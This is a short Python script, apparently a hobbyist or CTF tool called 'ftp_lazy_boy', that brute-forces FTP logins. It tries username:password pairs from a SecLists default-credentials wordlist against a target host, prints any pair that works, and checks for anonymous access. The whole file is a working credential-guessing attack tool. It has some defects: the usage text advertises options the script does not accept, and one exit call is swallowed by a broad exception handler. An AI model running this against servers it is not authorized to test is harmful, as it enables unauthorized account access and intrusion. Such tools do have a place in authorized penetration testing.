#!/usr/bin/env python3

import argparse
import sys
from ftplib import FTP 
import threading
from colorama import Fore, init

doclib= '''
Usage: ./ftp_lazy_boy.py [options]\n
Options: -i, --interface [hostname/ip] | Interface\n
         -h, --help [help] | print help\n
Example: ./ftp_lazy_boy.py -i 127.0.0.1 -u ./userlist.txt -p ./wordlist.txt -t 50
'''

def help():
    print(doclib)
    sys.exit(0)

def check_anonymous_login(interface):
    try:
        ftp = FTP(interface)
        ftp.login()
        print( "[+] Anonymous login is open")
        print( "[+] Username : anonymous")
        print( "[+] Password : anonymous \n")
        ftp.quit()
    except:
        pass

def ftp_login(interface, username, password):
    try:
        ftp = FTP(interface)
        ftp.login(username,password)
        ftp.quit()
        print( "[+] Found credentials: ")
        print("\tUsername: " + username)
        print("\tPassword: " + password)
        sys.exit(0)
    except:
        pass

def brute_force(interface, file):
    try:
        for credential in file:
            credential = credential.strip()
            credential_object = credential.split(":")
            username = credential_object[0]
            password = credential_object[1]
            ftp_login(interface, username, password)
    except:
        print("[-] Really nice gentlemen?")
        sys.exit(0)

parser = argparse.ArgumentParser()
parser.add_argument("-i","--interface")
args = parser.parse_args()

if not args.interface:
    help()
    sys.exit(0)

interface = args.interface
file = open('/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt',"r")
brute_force(interface, file)
check_anonymous_login(interface)
